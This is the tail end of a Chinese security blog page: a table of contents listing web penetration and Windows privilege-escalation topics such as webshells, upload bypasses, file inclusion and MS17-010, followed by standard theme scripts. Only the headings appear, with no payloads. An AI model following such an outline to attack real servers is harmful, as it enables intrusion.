class="nav-text">遗留文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#子域名"><span class="nav-number">5.3.5.</span> <span class="nav-text">子域名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#端口"><span class="nav-number">5.3.6.</span> <span class="nav-text">端口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#根据规律猜测"><span class="nav-number">5.3.7.</span> <span class="nav-text">根据规律猜测</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#phpMyAdmin与数据库外联"><span class="nav-number">6.</span> <span class="nav-text">phpMyAdmin与数据库外联</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#介绍"><span class="nav-number">6.1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#读文件"><span class="nav-number">6.2.</span> <span class="nav-text">读文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#load-file函数"><span class="nav-number">6.2.1.</span> <span class="nav-text">load_file函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LOAD-DATA语句"><span class="nav-number">6.2.2.</span> <span class="nav-text">LOAD DATA语句</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#写文件"><span class="nav-number">6.3.</span> <span class="nav-text">写文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#into-oufile-子句"><span class="nav-number">6.3.1.</span> <span class="nav-text">into oufile 子句</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#设置日志写文件"><span class="nav-number">6.3.2.</span> <span class="nav-text">设置日志写文件</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GETSHELL"><span class="nav-number">7.</span> <span class="nav-text">GETSHELL</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEBSHELL"><span class="nav-number">7.1.</span> <span class="nav-text">WEBSHELL</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#WEBSHELL的介绍"><span class="nav-number">7.1.1.</span> <span class="nav-text">WEBSHELL的介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WEBSHELL管理工具-菜刀"><span class="nav-number">7.1.2.</span> <span class="nav-text">WEBSHELL管理工具-菜刀</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#图片马"><span class="nav-number">7.1.3.</span> <span class="nav-text">图片马</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#上传漏洞"><span class="nav-number">7.2.</span> <span class="nav-text">上传漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#解析漏洞"><span class="nav-number">7.2.1.</span> <span class="nav-text">解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#IIS6-0解析漏洞"><span class="nav-number">7.2.1.1.</span> <span class="nav-text">IIS6.0解析漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Apache解析漏洞"><span class="nav-number">7.2.1.2.</span> <span class="nav-text">Apache解析漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Nginx解析漏洞"><span class="nav-number">7.2.1.3.</span> <span class="nav-text">Nginx解析漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CGI解析漏洞"><span class="nav-number">7.2.1.4.</span> <span class="nav-text">CGI解析漏洞</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#任意文件上传"><span class="nav-number">7.2.2.</span> <span class="nav-text">任意文件上传</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#前端JS验证"><span class="nav-number">7.2.3.</span> <span class="nav-text">前端JS验证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#服务端拓展名验证"><span class="nav-number">7.2.4.</span> <span class="nav-text">服务端拓展名验证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MIME验证"><span class="nav-number">7.2.5.</span> <span class="nav-text">MIME验证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传内容验证"><span class="nav-number">7.2.6.</span> <span class="nav-text">上传内容验证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#00截断"><span class="nav-number">7.2.7.</span> <span class="nav-text">00截断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#双文件上传"><span class="nav-number">7.2.8.</span> <span class="nav-text">双文件上传</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#数据库备份"><span class="nav-number">7.3.</span> <span class="nav-text">数据库备份</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#插配置文件"><span class="nav-number">7.4.</span> <span class="nav-text">插配置文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#编辑器漏洞"><span class="nav-number">7.5.</span> <span class="nav-text">编辑器漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EwebEditor"><span class="nav-number">7.5.1.</span> <span class="nav-text">EwebEditor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FCKeditor"><span class="nav-number">7.5.2.</span> <span class="nav-text">FCKeditor</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#查看版本"><span class="nav-number">7.5.2.1.</span> <span class="nav-text">查看版本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#爆绝对路径"><span class="nav-number">7.5.2.2.</span> <span class="nav-text">爆绝对路径</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#遍历目录"><span class="nav-number">7.5.2.3.</span> <span class="nav-text">遍历目录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#常用的上传地址"><span class="nav-number">7.5.2.4.</span> <span class="nav-text">常用的上传地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#突破建立文件夹"><span class="nav-number">7.5.2.5.</span> <span class="nav-text">突破建立文件夹</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#FCK上传GETSHELL"><span class="nav-number">7.5.2.6.</span> <span class="nav-text">FCK上传GETSHELL</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#修改模板文件"><span class="nav-number">7.6.</span> <span class="nav-text">修改模板文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#代码执行"><span class="nav-number">7.7.</span> <span class="nav-text">代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#测试代码"><span class="nav-number">7.7.1.</span> <span class="nav-text">测试代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#执行任意代码"><span class="nav-number">7.7.2.</span> <span class="nav-text">执行任意代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#构造WEBSHELL"><span class="nav-number">7.7.3.</span> <span class="nav-text">构造WEBSHELL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#写文件-1"><span class="nav-number">7.7.4.</span> <span class="nav-text">写文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#读文件-1"><span class="nav-number">7.7.5.</span> <span class="nav-text">读文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#代码执行函数"><span class="nav-number">7.7.6.</span> <span class="nav-text">代码执行函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令执行"><span class="nav-number">7.8.</span> <span class="nav-text">命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#测试环境"><span class="nav-number">7.8.1.</span> <span class="nav-text">测试环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#执行任意命令"><span class="nav-number">7.8.2.</span> <span class="nav-text">执行任意命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#写SHELL"><span class="nav-number">7.8.3.</span> <span class="nav-text">写SHELL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CMD下载文件"><span class="nav-number">7.8.4.</span> <span class="nav-text">CMD下载文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#命令执行函数"><span class="nav-number">7.8.5.</span> <span class="nav-text">命令执行函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件包含"><span class="nav-number">7.9.</span> <span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#本地文件包含LFI"><span class="nav-number">7.9.1.</span> <span class="nav-text">本地文件包含LFI</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#配合上传利用"><span class="nav-number">7.9.1.1.</span> <span class="nav-text">配合上传利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#配合Apache日志利用"><span class="nav-number">7.9.1.2.</span> <span class="nav-text">配合Apache日志利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#远程文件包含RFI"><span class="nav-number">7.9.2.</span> <span class="nav-text">远程文件包含RFI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#截断包含"><span class="nav-number">7.9.3.</span> <span class="nav-text">截断包含</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#00截断-1"><span class="nav-number">7.9.3.1.</span> <span class="nav-text">00截断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#和-截断"><span class="nav-number">7.9.3.2.</span> <span class="nav-text">.和/截断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#伪截断"><span class="nav-number">7.9.3.3.</span> <span class="nav-text">?伪截断</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP伪协议"><span class="nav-number">7.9.4.</span> <span class="nav-text">PHP伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#php-input"><span class="nav-number">7.9.4.1.</span> <span class="nav-text">php://input</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#data-text-plain"><span class="nav-number">7.9.4.2.</span> <span class="nav-text">data:text/plain</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php-filter"><span class="nav-number">7.9.4.3.</span> <span class="nav-text">php://filter</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phar"><span class="nav-number">7.9.4.4.</span> <span class="nav-text">phar://</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#file"><span class="nav-number">7.9.4.5.</span> <span class="nav-text">file://</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Windows服务器权限提升"><span class="nav-number">8.</span> <span class="nav-text">Windows服务器权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#提权常用的系统命令"><span class="nav-number">8.1.</span> <span class="nav-text">提权常用的系统命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#提权前的准备工作"><span class="nav-number">8.2.</span> <span class="nav-text">提权前的准备工作</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#信息收集-1"><span class="nav-number">8.2.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击方案制定"><span class="nav-number">8.2.2.</span> <span class="nav-text">攻击方案制定</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#缓冲区溢出"><span class="nav-number">8.3.</span> <span class="nav-text">缓冲区溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#本地溢出"><span class="nav-number">8.3.1.</span> <span class="nav-text">本地溢出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#远程溢出"><span class="nav-number">8.3.2.</span> <span class="nav-text">远程溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MS17010"><span class="nav-number">8.3.2.1.</span> <span class="nav-text">MS17010</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IIS6远程代码执行"><span class="nav-number">8.3.2.2.</span> <span class="nav-text">IIS6远程代码执行</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#数据库提权"><span class="nav-number">8.4.</span> <span class="nav-text">数据库提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MySQL提权"><span class="nav-number">8.4.1.</span> <span class="nav-text">MySQL提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#UDF提权"><span class="nav-number">8.4.1.1.</span> <span class="nav-text">UDF提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MOF提权"><span class="nav-number">8.4.1.2.</span> <span class="nav-text">MOF提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#启动项提权"><span class="nav-number">8.4.1.3.</span> <span class="nav-text">启动项提权</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSSQL提权"><span class="nav-number">8.4.2.</span> <span class="nav-text">MSSQL提权</span></a></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">AdminTony</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">72.8k</span>
  
</div>


  <div class="powered-by">由 <a class="theme-link" rel="external nofollow" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" rel="external nofollow" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>



<br><span>Hosted by <a rel="external nofollow" target="_blank" href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a></span>

        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>访客数
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>总访问量
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  
  

  

  

  

</body>
</html>
